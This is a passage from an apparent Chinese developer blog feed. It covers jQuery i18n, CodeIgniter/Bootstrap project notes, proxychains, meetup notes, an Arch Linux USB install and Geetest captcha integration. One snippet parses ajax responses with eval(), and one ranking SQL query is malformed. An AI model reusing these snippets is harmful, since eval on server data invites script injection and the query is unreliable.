class="string">'label'</span>] + <span class="string">': '</span>);</span><br><span class="line">	$(tabSearch).find(<span class="string">'option'</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">index, ele</span>) </span>&#123;</span><br><span class="line">		$(ele).text(dataSearch[<span class="string">'section'</span>][<span class="string">'op-'</span> + index]);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">lanToggle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//	click事件绑定, 用于语言切换</span></span><br><span class="line">	$(<span class="string">'.dropdown-menu'</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">index, element</span>) </span>&#123;</span><br><span class="line">		$(element).find(<span class="string">'a'</span>).bind(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">var</span> lang = $(<span class="keyword">this</span>).attr(<span class="string">'data-lang'</span>);</span><br><span class="line">			langCha(lang);</span><br><span class="line">			<span class="comment">//当前语言文字更换,例如显示当前语言: Language(English)</span></span><br><span class="line">			langSet(lang);	<span class="comment">//渲染</span></span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>3.en_US.json</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tab-search"</span>: &#123;</span><br><span class="line">		<span class="attr">"description"</span>: <span class="string">"json格式和命名, 比如这个是en_US.json, 其他的则是zh_CN.json .etc"</span>,</span><br><span class="line">    <span class="attr">"title"</span>: <span class="string">"Watch Search"</span>,</span><br><span class="line">    <span class="attr">"label"</span>: <span class="string">"Option"</span>,</span><br><span class="line">    <span class="attr">"section"</span>: &#123;</span><br><span class="line">      <span class="attr">"op-0"</span>: <span class="string">"Username"</span>,</span><br><span class="line">      <span class="attr">"op-1"</span>: <span class="string">"Watch IMEI"</span>,</span><br><span class="line">      <span class="attr">"op-2"</span>: <span class="string">"Phone number"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h2><p>本来想直接用jQuery的插件的, 然而用了半天发现这个有点问题, 从segment falut中找了一下方法, 就直接写了, 讲道理构造json和data-* 还是很花时间的.<br>贴个自己的项目地址<a href="https://github.com/a1exlism/kidee" target="_blank" rel="external">https://github.com/a1exlism/kidee</a>, 欢迎fork~</p>
<h2 id="Update-07-12-2016"><a href="#Update-07-12-2016" class="headerlink" title="Update-07/12/2016"></a>Update-07/12/2016</h2><p>最近在学ES6, 看到一个<code>Template String</code> 也能实现i18n =&gt; <a href="https://gist.github.com/DenisIzmaylov/dbd7e85f384016e3e07a](https://gist.github.com/DenisIzmaylov/dbd7e85f384016e3e07a" target="_blank" rel="external">https://gist.github.com/DenisIzmaylov/dbd7e85f384016e3e07a](https://gist.github.com/DenisIzmaylov/dbd7e85f384016e3e07a</a>)<br>这个translate思路可以的~</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CI and Bootstrap项目开发小结]]></title>
      <url>http://csser.work/11/22/2016/proj-ci/</url>
      <content type="html"><![CDATA[<h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>刚需, 第一次写后端, 第一次前后端分离这么彻底.<br>项目介绍: 一个在线<code>类</code>oj的评测系统(没有后台沙盒什么的跑程序), 有后台和用户端两个入口.<br>jquery正式接触, 用的不熟..写这篇文章主要是记录一下部分开发过程中遇到的一些实际问题.<br>CI版本:3.1.2</p>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main();"></a>Main();</h2><h3 id="front-end"><a href="#front-end" class="headerlink" title="front-end"></a>front-end</h3><ol>
<li><blockquote>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/classList" target="_blank" rel="external">JS控制元素的class(增删改查API)</a> <br><br>div.classList.add(CLASS)<br>.remove(CLASS)<br>.contain(CLASS)</p>
</blockquote>
</li>
<li><p><a href="http://caibaojian.com/jquery-each-json.html" target="_blank" rel="external">ajax对php echo的数据处理</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">	...,</span><br><span class="line">	success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">		data = <span class="built_in">eval</span>(data);		<span class="comment">//	string 转换为json对象</span></span><br><span class="line">		<span class="keyword">for</span> (key <span class="keyword">in</span> data) &#123;</span><br><span class="line">			<span class="built_in">console</span>.log(data[key]);	<span class="comment">//	对象遍历</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>jQuery对ajax的各种封装方法<br><a href="https://my.oschina.net/LuckyWinty/blog/637632?fromerr=lVC30yU2" target="_blank" rel="external">https://my.oschina.net/LuckyWinty/blog/637632?fromerr=lVC30yU2</a></p>
</li>
<li><p>jQuery获取动态绑定对象<br><a href="http://www.mr-jie.com/?id=39" target="_blank" rel="external">模拟document点击事件</a></p>
</li>
<li><p><a href="https://www.formget.com/css-design-in-select-option/" target="_blank" rel="external">下拉栏的css设置</a></p>
</li>
</ol>
<h3 id="server-side"><a href="#server-side" class="headerlink" title="server-side"></a>server-side</h3><ol>
<li><p>session加载错误<br>错误描述：<br>Message: mkdir() [function.mkdir]: Invalid argument<br>Message: Session: Configured save path ‘’ is not a directory, doesn’t exist or cannot be created.<br>解决方案：<br>更改 application/config/config.php中的<code>$config[&#39;sess_save_path&#39;]</code><br>refer:<a href="http://codeigniter.org.cn/forums/thread-21295-1-1.html" target="_blank" rel="external">http://codeigniter.org.cn/forums/thread-21295-1-1.html</a></p>
</li>
<li><p>CI多入口解决方案<br>见blog-CI 分类</p>
</li>
<li><p>改进load-&gt;view()进行多页面不同的资源文件加载</p>
<blockquote>
<p><a href="http://www.dewen.net.cn/q/1702/PHP+CI+$this-&gt;load-&gt;view(" target="_blank" rel="external">冯义军@德问</a>;方法修改)<br>loadfile.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$config[<span class="string">'loadfile'</span>] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'js'</span> =&gt; <span class="keyword">array</span>(<span class="string">'base'</span>=&gt; <span class="keyword">array</span>(<span class="string">'common.js'</span>,<span class="string">'base.js'</span>,<span class="string">'lib.js'</span>),<span class="string">'full'</span> =&gt; <span class="string">'xx.js'</span>,<span class="string">'xxx1.js'</span>,<span class="string">'.....'</span>,<span class="string">'homePage'</span> =&gt; <span class="string">'xxx.js'</span>);</span><br><span class="line"><span class="string">'css'</span> =&gt; ....</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<p>那么在load view 前更具不同的页面先调用不同的配置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span> -&gt; load -&gt; config(<span class="string">'loadfile'</span>);</span><br><span class="line">$loadFiles = <span class="keyword">$this</span> -&gt; config -&gt; item(<span class="string">'loadfile'</span>);</span><br><span class="line">$data[<span class="string">'js'</span>] =  $loadFiles[<span class="string">'js'</span>][<span class="string">'homePage'</span>];</span><br><span class="line">$data[<span class="string">'css'</span>] = $loadFiles[<span class="string">'css'</span>][<span class="string">'base'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;load-&gt;view(<span class="string">"xxx"</span>,$data);</span><br></pre></td></tr></table></figure></p>
<p>在xxx模板页面中写：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">$this</span>-&gt;load-&gt;view(<span class="string">'header'</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>在header文件中引入js和css的地方写为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>($js <span class="keyword">as</span> $jsf)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript" src="xxx/js/'</span>.$jsf.<span class="string">'"&gt;&lt;/script&gt;'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($css <span class="keyword">as</span> $cssf)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;link rel="stylesheet" type="text/css" href="css/'</span>.$cssf.<span class="string">'" /&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><ol>
<li>获取排名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) + <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">TABLE</span> <span class="keyword">where</span> score &gt; (<span class="keyword">select</span> score <span class="keyword">from</span> <span class="keyword">TABLE</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="keyword">ID</span>) <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>如果有时间字段, 则加一个字段即可.</p>
<ol>
<li><code>MySQL</code>中无法对一张表同时update和select<br><a href="http://stackoverflow.com/questions/45494/mysql-error-1093-cant-specify-target-table-for-update-in-from-clause" target="_blank" rel="external">MySQL Error 1093 - Can’’t specify target table for update in FROM clause</a></li>
</ol>
<p>利用别名设置成新表.例子:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 按照每个用户抢到二楼的数量从多到少对用户排序</span></span><br><span class="line"><span class="keyword">SELECT</span> reply_id, <span class="keyword">count</span>(<span class="keyword">floor</span>) <span class="keyword">AS</span> c <span class="keyword">FROM</span></span><br><span class="line">  (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> replies <span class="keyword">WHERE</span> <span class="keyword">floor</span> = <span class="number">2</span>) <span class="keyword">AS</span> T</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> reply_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> c;</span><br></pre></td></tr></table></figure></p>
<h3 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h3><p>后记: 感觉自己开发周期太长了= =</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Linux佳软推荐_proxychains]]></title>
      <url>http://csser.work/11/09/2016/linux-proxychains/</url>
      <content type="html"><![CDATA[<h3 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h3><p>实在受不了有时候浏览器下载时快时慢的问题, 问了下同学, 道:”prxoychains能给软件直接前置代理”.</p>
<h3 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h3><p>安装配置很简单<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install proxychains</span><br><span class="line">sudo vi /etc/proxychains.conf</span><br><span class="line"><span class="comment"># 按照格式写就行了</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>使用<br>proxychains wget <a href="http://xxx.xxx.xxx" target="_blank" rel="external">http://xxx.xxx.xxx</a><br>proxychains slack</p>
</blockquote>
<p>找的时候顺便看到了一个比较好的一个网站<br><a href="https://www.hidemyass.com/proxy" target="_blank" rel="external">hidemyass</a></p>
<p>以前还觉得这个好辣鸡, 看到这个下载速度就感觉以前好蠢= =</p>
<hr>
<h3 id="17-3-12-update"><a href="#17-3-12-update" class="headerlink" title="17-3-12 update"></a>17-3-12 update</h3><p>一直懒得改..</p>
<p>鉴于一些app和原生的proxychains不兼容, 所以加一个<a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="external">proxychains-ng</a><br>混合使用挺好的, PS: npm建议不要用<br>cmd:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4</span><br></pre></td></tr></table></figure></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Node Party[3nd]小记]]></title>
      <url>http://csser.work/10/22/2016/node-party/</url>
      <content type="html"><![CDATA[<h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>挺喜欢js的, 看到这个就报名了, 报名费居然也在红包中返回了手上(233).</p>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h2><h3 id="0x01-the-missing-part-of-TDD-shupengfei"><a href="#0x01-the-missing-part-of-TDD-shupengfei" class="headerlink" title="0x01. the missing part of TDD @shupengfei"></a>0x01. the missing part of TDD <code>@shupengfei</code></h3><p>Test-Driven Development 驱动测试开发, 差不多像单元测试<br>说实话, tdd这个经常在node的文档中看到, 但是自己也没有写过, 仅限于能看懂.<br>dalao的演讲受益匪浅, 做了笔记, 写在这里</p>
<blockquote>
<p>“所有代码都会腐烂”<br>“这个代码应该有人来重构一下, 但不是我” 都表明了在长时间之后的代码变得难以读懂, 难以维护.<br>所以tdd就上线来解决这个问题了~</p>
</blockquote>
<p>我听完演讲之后对tdd操作的理解: 由简到繁, function(x)给个要求之后用最少代码实现.<br>if是while的unit, 这个也挺有意思的~<br>还有演讲示例用到了<code>递归</code>, 递归其实挺好用的, 如果不溢出, 按照摩尔定律, 这个性能问题会逐渐消失(除非你代码有fatal error).</p>
<p>演讲用到了两个例子:</p>
<ol>
<li><p>factorization<br>要求只能按照记忆来了:[] -&gt; [1] -&gt; [2] -&gt; [n](出现问题,分类讨论) -&gt; [2,2] -&gt; [2, 4] -&gt; [3, 3]…</p>
</li>
<li><p>Sort Alogrithm<br>[] -&gt; [1] -&gt; [1,2] -&gt; [1,3,2](出现问题, 进一步讨论) -&gt; [3,2,1] -&gt; [x, y, z]</p>
</li>
</ol>
<h3 id="0x02-Atom背后的故事-jysperm"><a href="#0x02-Atom背后的故事-jysperm" class="headerlink" title="0x02. Atom背后的故事@jysperm"></a>0x02. Atom背后的故事<code>@jysperm</code></h3><p>以前用atom的时候很多sublime的操作虽然有兼容, 但是atom始终没办法和sublime比运行速度, 总是用着用着就用回sublime了…遇到问题很多时候都会跳转到精子哥的中文社区<a href="https://atom-china.org/" target="_blank" rel="external">atom中文社区</a>, 今天见到还是挺开心的.</p>
<p>atom和vscode的模型我还真没去自己研究过, 发现就是<code>electron APP</code>, 下图是electron组件图:<img src="/imgs/conferences/node_party/3_1.png" alt="1"><br>优点很明显</p>
<blockquote>
<p>内置chromium内核, 不需要用户支持更新;Node版本自己控制, 随时可以使用最新的语法;Native APIs的原生支持, 保证了跨平台的支持.</p>
</blockquote>
<p>后面的话就是一些关于atom的一些hack定制, 和内置的API调用模式等等, 然后也提到了atom的性能问题,比如:<br>1.内置的node_modules整合为单文件模式app.asar, 解决大量小文件读写速度慢的问题;<br>2.利用<code>virtual dom</code>来解决<code>reflow &amp; repaint</code>的多次渲染问题;<br>3.针对于大文件加载, 使用了<code>transform3d</code>来进行块加载, 每次只加载需要显示的部分.</p>
<h3 id="0x03-Prototype-of-“JS-Native”"><a href="#0x03-Prototype-of-“JS-Native”" class="headerlink" title="0x03. Prototype of “JS-Native”"></a>0x03. Prototype of “JS-Native”</h3><p>这个看完ppt然后也没得出什么结论, 就不写了.</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Arch (U)EFI安装至U盘]]></title>
      <url>http://csser.work/10/16/2016/arch-efi-udisk-install/</url>
      <content type="html"><![CDATA[<h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>Ubuntu用久了也有点乏味, 部分软件用的也不舒服, 正好win盘区也要删了, 打算大半个月后上Arch.<br>anyway, 先用U盘系统练练手吧~</p>
<p>帮助文档就一个.<a href="https://wiki.archlinux.org/index.php/Installation_guide_" target="_blank" rel="external">arch-wiki</a></p>
<h2 id="U盘分区"><a href="#U盘分区" class="headerlink" title="U盘分区"></a>U盘分区</h2><p>扯: 以前用的DiskGenius进行的GPT分区, 现在在ubuntu下替代品是<code>gparted</code>, 感觉是更加高效, 不过好像没看到4k对齐这个功能..</p>
<p>EFI引导的系统就和前面DiskGenius设置的一样有个ESP(EFI System Partition)分区, 还有个MSR分区(查了一下, 非特殊情况可忽略)</p>
<p>这边给两个参考:<br><a href="https://my.oschina.net/abcfy2/blog/491140" target="_blank" rel="external">U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式-oschina</a> <a href="https://jiavictor.wordpress.com/2010/03/12/gpt%E5%88%9D%E6%8E%A2%EF%BC%88%E6%88%91%E6%89%BF%E8%AE%A4%E6%88%91%E5%BE%88%E8%90%BD%E5%90%8E%EF%BC%8C%E5%BE%88%E8%90%BD%E5%90%8E%EF%BC%81%EF%BC%89/" target="_blank" rel="external">gpt初探（我承认我很落后，很落后！）</a></p>
<p>安装下gparted(GUI),</p>
<h3 id="设置GPT分区"><a href="#设置GPT分区" class="headerlink" title="设置GPT分区"></a>设置GPT分区</h3><p>进入gparted, device &gt; create partition tables &gt; select “GPT” 此操作会<code>清空u盘数据</code></p>
<h3 id="创建ESP分区"><a href="#创建ESP分区" class="headerlink" title="创建ESP分区"></a>创建ESP分区</h3><p>new &gt; partition , 类型<code>fat32</code>, 大小300M. 创建完之后 manage flag, 更改为 <code>ESP</code>, 默认会同时选择Boot.</p>
<h3 id="检查ESP"><a href="#检查ESP" class="headerlink" title="检查ESP"></a>检查ESP</h3><blockquote>
<p>查看自己的u盘挂载点<br>sudo fdisk -l</p>
<p>查看是否为GPT格式<br>sudo gdisk -l /dev/sdc # 填自己的device</p>
<p>查看ESP生成是否正确<br>sudo parted /dev/sdc print</p>
</blockquote>
<p>主要看起始点是否在<code>EF00</code>, flag显示boot, esp</p>
<p>样例图:<br><img src="/imgs/arch_efi_udisk_install/1.png" alt="1"><br><img src="/imgs/arch_efi_udisk_install/2.png" alt="2"></p>
<h3 id="硬盘分区"><a href="#硬盘分区" class="headerlink" title="硬盘分区"></a>硬盘分区</h3><p>分区划分的话可以从这边找到<a href="https://wiki.archlinux.org/index.php/Partitioning_" target="_blank" rel="external">https://wiki.archlinux.org/index.php/Partitioning_</a></p>
<p>不过鉴于U盘一共也才30G, 所以设置如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/efi 	sda1 300M</span><br><span class="line">/boot sda2 500M	<span class="comment">#看了视频后才加的, 不是很懂~</span></span><br><span class="line">/ 		sda3 12G</span><br><span class="line">/home	sda4 8G</span><br><span class="line">/var	sda5 5G</span><br><span class="line">swap	sda6 4G</span><br></pre></td></tr></table></figure></p>
<p>分区工具<code>gdisk</code>, 还是视频比较好接受一点..给个Youtube视频:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/El8z3UkTHcg" frameborder="0" allowfullscreen></iframe>

<p>分区完之后检查:<br>sudo fdisk -l<br><img src="/imgs/arch_efi_udisk_install/3.png" alt="3"></p>
<h3 id="分区格式化"><a href="#分区格式化" class="headerlink" title="分区格式化"></a>分区格式化</h3><p>工具: <code>mkfs.xxx</code>, <code>mkswap</code> xxx表示文件格式, 第二个顾名思义, 创建swap空间</p>
<p>mkfs –help 这个帮助文档很简洁~</p>
<h3 id="分区挂载"><a href="#分区挂载" class="headerlink" title="分区挂载"></a>分区挂载</h3><p>工具<code>mount</code></p>
<blockquote>
<p>样例: 挂载设备sda2 到/boot<br>mount /dev/sda2 /boot</p>
</blockquote>
<p><code>Warning: 这个是还没有安装的情况下, 需要mount在mnt下</code><br>这边的文件结构将efi放到了/mnt/boot下, 所有的一切本质都是文件操作, 所以需要创建一个<code>/mnt/boot/efi</code>文件夹,之后挂载/dev/sda1</p>
<h2 id="Other-Important"><a href="#Other-Important" class="headerlink" title="Other Important"></a>Other Important</h2><p>官方Wiki介绍的很详细, 所以有一部分我就不写了</p>
<h3 id="关于安装时候的tips"><a href="#关于安装时候的tips" class="headerlink" title="关于安装时候的tips"></a>关于安装时候的tips</h3><p>记得设置一下/etc/pacman.conf<br>开启<code>TotalDownload</code></p>
<h3 id="关于-mnt-etc-fstab"><a href="#关于-mnt-etc-fstab" class="headerlink" title="关于/mnt/etc/fstab"></a>关于/mnt/etc/fstab</h3><p><img src="/imgs/arch_efi_udisk_install/4.png" alt="4"><br>cat了一下, 发现是开机自动mount的配置文件, 前面的swap现在就可以加上去了</p>
<h3 id="关于chroot"><a href="#关于chroot" class="headerlink" title="关于chroot"></a>关于chroot</h3><p>用了发现相当于复制了一个完全的环境变量.</p>
<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>学了一点命令下的工具吧, 还有一些思想~</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CodeIgniter使用极验验证]]></title>
      <url>http://csser.work/10/07/2016/php-ci-verification/</url>
      <content type="html"><![CDATA[<h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>怕存在不正当请求导致的服务器ddos, 采用<code>极验验证</code>进行部分阻挡~<br>参考了底下的thinkphp教程</p>
<h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>Demo项目</p>
<blockquote>
<p>git clone <a href="https://github.com/GeeTeam/gt-php-sdk.git" target="_blank" rel="external">https://github.com/GeeTeam/gt-php-sdk.git</a></p>
</blockquote>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h2><h3 id="demo目录结构"><a href="#demo目录结构" class="headerlink" title="demo目录结构"></a>demo目录结构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gt-php-sdk/</span><br><span class="line">├── composer.json <span class="comment">#标志/可删</span></span><br><span class="line">├── config</span><br><span class="line">│   └── config.php <span class="comment">#内建环境变量</span></span><br><span class="line">├── lib</span><br><span class="line">│   └── class.geetestlib.php <span class="comment">#封装类库</span></span><br><span class="line">├── README.rst</span><br><span class="line">├── static</span><br><span class="line">│   └── login.html <span class="comment">#前端页面</span></span><br><span class="line">└── web</span><br><span class="line">    ├── StartCaptchaServlet.php <span class="comment">#遮罩controllers</span></span><br><span class="line">    └── VerifyLoginServlet.php <span class="comment">#验证controllers</span></span><br></pre></td></tr></table></figure>
<h3 id="前端页面"><a href="#前端页面" class="headerlink" title="前端页面"></a>前端页面</h3><p>用的<code>bootstrap</code>框架<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span> <span class="attr">id</span>=<span class="string">"login-div"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-10 col-xs-offset-1 col-md-4 col-md-offset-4"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form-login"</span> <span class="attr">action</span>=<span class="string">"login"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">role</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">id</span>=<span class="string">"user-login"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span> <span class="attr">tabindex</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"pass-login"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span> <span class="attr">tabindex</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-8 col-xs-offset-2 col-lg-10 col-lg-offset-1"</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Login In"</span> <span class="attr">id</span>=<span class="string">"cover-submit-login"</span> <span class="attr">class</span>=<span class="string">"btn btn-success form-control"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"mask"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"popup-captcha"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="集成类库"><a href="#集成类库" class="headerlink" title="集成类库"></a>集成类库</h3><p>CI在application目录下有个<code>library</code>目录, 在里面创建一个名为<code>Geetestlib</code>的php文件.<br>内容和class一样, 通过class封装.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geetestlib</span> </span>&#123;</span><br><span class="line">	<span class="comment"># class.geetestlib.php's codes</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="控制器集成"><a href="#控制器集成" class="headerlink" title="控制器集成"></a>控制器集成</h3><p>改名为<code>Geetest.php</code><br>这边的话尝试过利用<code>$this-&gt;load-&gt;library()</code>, 用着用着不知道怎么玩了..所以最后采取的原生require</p>
<blockquote>
<p>require_once dirname(dirname(<strong>FILE</strong>)).’/libraries/Geetestlib.php’;</p>
</blockquote>
<ol>
<li>定义私有变量, 并设置默认构造函数</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $captcha_id;</span><br><span class="line"><span class="keyword">private</span> $private_key;</span><br><span class="line"><span class="keyword">private</span> $GtSdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">parent</span>::__construct();</span><br><span class="line">  <span class="keyword">$this</span>-&gt;captcha_id = <span class="string">"xxx"</span>;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;private_key = 